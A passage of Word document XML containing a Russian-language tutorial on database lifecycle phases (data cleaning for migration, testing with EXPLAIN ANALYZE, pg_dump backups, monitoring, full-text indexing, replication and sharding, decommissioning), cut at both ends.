    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы при миграции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Дубликаты (один товар записан 10 раз)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Опечатки ("Одежда" vs "одежда" vs "Одежжда")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Неправильные типы данных (цена записана как текст "150 руб")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Отсутствующие данные (пустые ячейки)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Написать скрипт очистки данных (Python + pandas):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>import pandas as pd</w:t>
        <w:br/>
        <w:br/>
        <w:t>df = pd.read_excel('products.xlsx')</w:t>
        <w:br/>
        <w:t>df = df.drop_duplicates()  # убрать дубликаты</w:t>
        <w:br/>
        <w:t>df['price'] = df['price'].str.replace(' руб', '').astype(float)  # очистить цену</w:t>
        <w:br/>
        <w:t>df['category_name'] = df['category_name'].str.strip().str.capitalize()  # привести категории к единому виду</w:t>
        <w:br/>
        <w:t>df.to_csv('products_clean.csv', index=False)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фаза 5: Тестирование (Testing)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Проверяем, что БД работает корректно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Виды тестов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.1. Функциональное тестирование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проверяем, что запросы работают правильно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регистрация пользователя → пользователь появился в таблице `users`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оформление заказа → запись в `orders` и `order_items`, уменьшилось `stock_quantity`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Удаление пользователя → его заказы тоже удалились (CASCADE работает)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.2. Тестирование производительности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проверяем скорость работы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выборка 1000 товаров: должна занимать &lt; 50 мс</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Поиск пользователя по email: &lt; 10 мс (благодаря индексу)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Создание заказа: &lt; 100 мс</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструменты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`EXPLAIN ANALYZE` (PostgreSQL) — показывает план выполнения запроса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>pgBench (PostgreSQL) — нагрузочное тестирование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JMeter — симуляция одновременных запросов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 7: Проверка индекса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Запрос без индекса (плохо):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>EXPLAIN ANALYZE SELECT * FROM users WHERE email = 'user@example.com';</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Seq Scan on users  (cost=0.00..1500.00 rows=1 width=100) (actual time=25.123..25.125 rows=1 loops=1)</w:t>
        <w:br/>
        <w:t>-- Planning Time: 0.1 ms</w:t>
        <w:br/>
        <w:t>-- Execution Time: 25.2 ms</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Seq Scan</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = последовательное сканирование (перебор всей таблицы) → медленно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Создаём индекс:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE INDEX idx_users_email ON users(email);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Запрос с индексом (хорошо):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>EXPLAIN ANALYZE SELECT * FROM users WHERE email = 'user@example.com';</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Index Scan using idx_users_email on users  (cost=0.29..8.30 rows=1 width=100) (actual time=0.015..0.017 rows=1 loops=1)</w:t>
        <w:br/>
        <w:t>-- Planning Time: 0.1 ms</w:t>
        <w:br/>
        <w:t>-- Execution Time: 0.05 ms</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Index Scan</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> = поиск по индексу → в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>500 раз быстрее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (25 мс → 0.05 мс).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Индексы критичны для производительности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>5.3. Тестирование целостности данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проверяем, что ограничения работают:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нельзя создать товар с отрицательной ценой (CHECK constraint)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нельзя удалить товар, который есть в заказе (RESTRICT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нельзя создать заказ для несуществующего пользователя (FOREIGN KEY)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фаза 6: Эксплуатация (Operation / Maintenance)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> БД работает в продакшене, пользователи её используют.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задачи администратора БД (DBA):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>6.1. Резервное копирование (Backup)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Виды бэкапов:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Полный (Full Backup):** копия всей БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Инкрементный (Incremental):** только изменения с последнего бэкапа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дифференциальный (Differential):** изменения с последнего полного бэкапа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стратегия 3-2-1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**3 копии:** оригинал + 2 бэкапа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2 разных носителя:** SSD + HDD (или облако)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1 копия off-site:** в другом дата-центре (на случай пожара)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример PostgreSQL:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Полный бэкап</w:t>
        <w:br/>
        <w:t>pg_dump myshop &gt; myshop_backup_2025-01-14.sql</w:t>
        <w:br/>
        <w:br/>
        <w:t># Бэкап с сжатием</w:t>
        <w:br/>
        <w:t>pg_dump myshop | gzip &gt; myshop_backup_2025-01-14.sql.gz</w:t>
        <w:br/>
        <w:br/>
        <w:t># Восстановление</w:t>
        <w:br/>
        <w:t>psql myshop &lt; myshop_backup_2025-01-14.sql</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Частота бэкапов:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> зависит от критичности данных.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Банк: каждые 15 минут</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Интернет-магазин: раз в день</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блог: раз в неделю</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>6.2. Мониторинг производительности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что отслеживаем:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CPU usage:** процессор БД не должен быть загружен на 100%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RAM usage:** БД любят жрать память (кэш)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Disk I/O:** скорость чтения/записи на диск</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Connections:** количество одновременных подключений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Slow queries:** медленные запросы (&gt; 1 секунды)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструменты мониторинга:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Prometheus + Grafana** — визуализация метрик</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**pgAdmin** — GUI для PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Percona Monitoring** — для MySQL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример проблемы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Внезапно сайт стал тормозить. Смотрим в мониторинг:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Slow Query Log:</w:t>
        <w:br/>
        <w:t>SELECT * FROM products WHERE name LIKE '%носк%';  -- 2.5 секунды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Причина:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Запрос `LIKE '%носк%'` не использует индекс (% в начале = полное сканирование).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Использовать полнотекстовый поиск (Full-Text Search):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Создаём индекс для полнотекстового поиска</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_products_name_fts ON products USING GIN (to_tsvector('russian', name));</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Новый запрос (быстро)</w:t>
        <w:br/>
        <w:t>SELECT * FROM products WHERE to_tsvector('russian', name) @@ to_tsquery('russian', 'носк');</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>6.3. Обновление схемы (Миграции)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ситуация:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Через год после запуска нужно добавить поле "скидка" для товаров.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Миграция:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ALTER TABLE products ADD COLUMN discount DECIMAL(5, 2) DEFAULT 0 CHECK (discount &gt;= 0 AND discount &lt;= 100);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> На production-БД 10 миллионов товаров, ALTER TABLE может занять часы и заблокировать таблицу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Миграция без даунтайма (zero-downtime migration):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Создать новую таблицу с нужной схемой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Скопировать данные порциями (batches)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Переключить приложение на новую таблицу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Удалить старую таблицу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фаза 7: Поддержка и модернизация (Support &amp; Evolution)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Добавляем новые фичи, оптимизируем, масштабируем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>7.1. Вертикальное масштабирование (Scale Up)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Увеличить ресурсы сервера (больше CPU, RAM, SSD).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сервер с 16 GB RAM → 64 GB RAM.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Просто.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Есть предел (нельзя бесконечно увеличивать).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>7.2. Горизонтальное масштабирование (Scale Out)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Метод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Добавить больше серверов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Варианты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Репликация (Replication):** Мастер-сервер (запись) + несколько реплик (чтение). Читающие запросы распределяются между репликами → снижение нагрузки.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шардирование (Sharding):** Разделение данных между серверами. Например, пользователи A-M на сервере 1, N-Z на сервере 2.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 8: Расчёт нагрузки на БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ситуация:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Интернет-магазин растёт. Текущая нагрузка:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>10 000 пользователей онлайн</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый делает 5 запросов в минуту</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Итого: 10 000 × 5 / 60 = 833 запроса в секунду (QPS, Queries Per Second)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Один сервер PostgreSQL (16 CPU, 64 GB RAM, SSD):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Максимальная пропускная способность: ~5000 QPS (при оптимизации)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Текущая нагрузка:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 833 QPS → сервер справляется.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Прогноз:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> рост до 100 000 пользователей → 8330 QPS → нужно масштабирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Включить репликацию: 1 мастер (запись) + 3 реплики (чтение)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>80% запросов — чтение → распределяем на 3 реплики: 8330 × 0.8 / 3 ≈ 2220 QPS на реплику (норм)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>20% запросов — запись → мастер: 8330 × 0.2 = 1666 QPS (норм)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выдержим рост до 100 000 пользователей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фаза 8: Вывод из эксплуатации (Decommissioning)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> БД больше не нужна, выключаем.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Причины:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проект закрыли</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мигрировали на новую систему</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Объединили несколько БД в одну</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Архивирование:** Сохранить данные на долгий срок (для аудита, законов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Экспорт:** Выгрузить данные в формат CSV/JSON (на случай, если понадобятся)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Миграция:** Перенести данные в новую систему</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Удаление:** Безопасно удалить БД (перезатереть диски, чтобы данные нельзя было восстановить)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Компания мигрирует с MySQL на PostgreSQL.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>План:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Поднять PostgreSQL рядом с MySQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Экспортировать данные из MySQL: `mysqldump &gt; data.sql`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
